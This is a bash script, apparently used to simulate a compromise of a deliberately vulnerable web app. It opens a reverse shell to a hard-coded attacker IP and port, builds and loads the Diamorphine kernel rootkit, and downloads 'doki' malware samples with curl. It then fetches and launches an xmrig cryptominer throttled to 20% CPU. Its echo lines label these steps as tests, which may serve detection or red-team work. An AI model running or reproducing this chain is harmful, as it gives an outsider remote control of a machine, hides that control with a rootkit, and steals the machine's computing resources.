#!/bin/bash
######################################################
MODIFIED_HASH='e93d9dbb7f2179af9cb332d372e9164e786954d1a1f83d294e95d3404678faca'
MALWARE_HASH='doki_4aadb47706f0fe1734ee514e79c93eed65e1a0a9f61b63f3e7b6367bd9a3e63b'
MALWARE_ADDRESS='s1demostorageaccount.z13.web.core.windows.net'
ATTACKER_REVERSE='13.126.42.155'
ATTACKER_PORT='1109'
KO="diamorphine.ko"

echo "Updating packages..."
sudo su & sudo apt update 1> /dev/null
sudo apt-get install build-essential libncurses-dev linux-headers-$(uname -r) -y 1> /dev/null
sleep 1

# Reverse shell to listener
bash -i >& /dev/tcp/$ATTACKER_REVERSE/$ATTACKER_PORT 0>&1 &

# Build Diamorphone and insmod

echo "Clone rootkit and build..."
git clone https://github.com/m0nad/Diamorphine &
sleep 1
make -C /var/www/html/vulnerabilities/exec/Diamorphine/ && sudo insmod /var/www/html/vulnerabilities/exec/Diamorphine/$KO
sleep 1

# Send in the dokis

echo "Running doki malware download test..."
curl "https://$MALWARE_ADDRESS/samples/elf/$MALWARE_HASH" -o doki
echo "Running doki modified malware test..."
curl "https://$MALWARE_ADDRESS/samples/elf/${MODIFIED_HASH}_random" -o "doki_random"

# Launch miner with low CPU / hide

echo "Cloning miner..."
wget "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-focal-x64.tar.gz"
tar zxvf "xmrig-6.18.0-focal-x64.tar.gz" 1> /dev/null
echo "Starting miner CPU=20...."
/var/www/html/vulnerabilities/exec/xmrig-6.18.0/xmrig --donate-level 1 --max-cpu-usage 20 -o xmr.pool.minergate.com:45700 -u miner@tyl3r.io -p x -k > logs 2>&1 &
exit 0
